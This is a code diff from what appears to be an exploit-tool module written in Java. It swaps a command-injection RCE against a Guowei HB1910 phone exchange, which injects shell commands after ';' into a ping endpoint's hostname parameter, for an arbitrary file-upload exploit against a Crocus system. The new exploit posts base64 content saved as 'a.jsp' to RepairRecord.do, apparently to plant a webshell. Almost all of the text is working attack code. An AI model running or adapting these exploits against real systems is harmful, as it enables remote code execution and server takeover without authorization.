@@ -7,16 +7,13 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
-public class GuoweiHB1910RCE {
+public class CrocusRepairRecordUpload {
     
-    // 发送国威HB1910数字程控电话交换机RCE请求并返回响应
-    public static String sendRCEAndGetResponse(String baseUrl, String command) throws Exception {
-        String requestUrl = baseUrl;
-        String requestMethod = "GET";
-        
-        // 对命令进行URL编码
-        String encodedCommand = java.net.URLEncoder.encode(command, "UTF-8");
-        requestUrl = baseUrl + "/modules/ping/generate.php?send=Ping&hostname=;" + encodedCommand;
+    // 发送Crocus系统RepairRecord.do文件上传请求并返回响应
+    public static String sendFileUploadRequest(String baseUrl, String base64EncodedImage) throws Exception {
+        // 更新请求URL
+        String requestUrl = baseUrl + "/RepairRecord.do?Action=imageupload";
+        String requestMethod = "POST";
         
         URL url = new URL(requestUrl);
         HttpURLConnection connection;
@@ -31,14 +28,30 @@ public class GuoweiHB1910RCE {
             connection = (HttpURLConnection) url.openConnection();
         }
         
+        // 更新请求头
         connection.setRequestMethod(requestMethod);
         connection.setRequestProperty("Host", Utils.getHostWithPort(url));
-
-        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0");
+        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0");
         connection.setRequestProperty("Accept", "*/*");
-        connection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
-        connection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
-        connection.setRequestProperty("Connection", "keep-alive");
+        connection.setRequestProperty("Accept-Encoding", "gzip, deflate");
+        connection.setRequestProperty("Connection", "close");
+        connection.setRequestProperty("Content-Type", "application/json");
+        connection.setDoOutput(true);
+        
+        // 设置JSON请求体，使用传入的base64EncodedImage
+        String jsonRequestBody = "{\n" +
+                                "  \"username\": \"streamax20020818\",\n" +
+                                "  \"license\": \"1\",\n" +
+                                "  \"chnnel\": 1,\n" +
+                                "  \"type\": 1,\n" +
+                                "  \"imsage\": \"" + base64EncodedImage + "\",\n" +
+                                "  \"picturename\": \"a.jsp\"\n" +
+                                "}";
+        
+        try (java.io.DataOutputStream dos = new java.io.DataOutputStream(connection.getOutputStream())) {
+            dos.writeBytes(jsonRequestBody);
+            dos.flush();
+        }
         
         // 设置连接和读取超时为20秒
         connection.setConnectTimeout(20000);
@@ -48,14 +61,16 @@ public class GuoweiHB1910RCE {
         StringBuilder requestDetails = new StringBuilder();
         // 添加原始请求头
         requestDetails.append("原始请求头:\n");
-        requestDetails.append("GET ").append(url.getFile()).append(" HTTP/1.1\n");
-        requestDetails.append("Host: ").append(Utils.getHostWithPort(url)).append("\n");
-
-        requestDetails.append("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\n");
+        requestDetails.append("POST " + url.getFile() + " HTTP/1.1\n");
+        requestDetails.append("Host: " + Utils.getHostWithPort(url) + "\n");
+        requestDetails.append("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0\n");
+        requestDetails.append("Content-Type: application/json\n");
+        requestDetails.append("Accept-Encoding: gzip, deflate\n");
         requestDetails.append("Accept: */*\n");
-        requestDetails.append("Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n");
-        requestDetails.append("Accept-Encoding: gzip, deflate, br\n");
-        requestDetails.append("Connection: keep-alive\n\n");
+        requestDetails.append("Connection: close\n\n");
+        
+        // 添加请求体信息
+        requestDetails.append("请求体:\n" + jsonRequestBody + "\n");
 
         int responseCode = connection.getResponseCode();
         StringBuilder response = new StringBuilder();
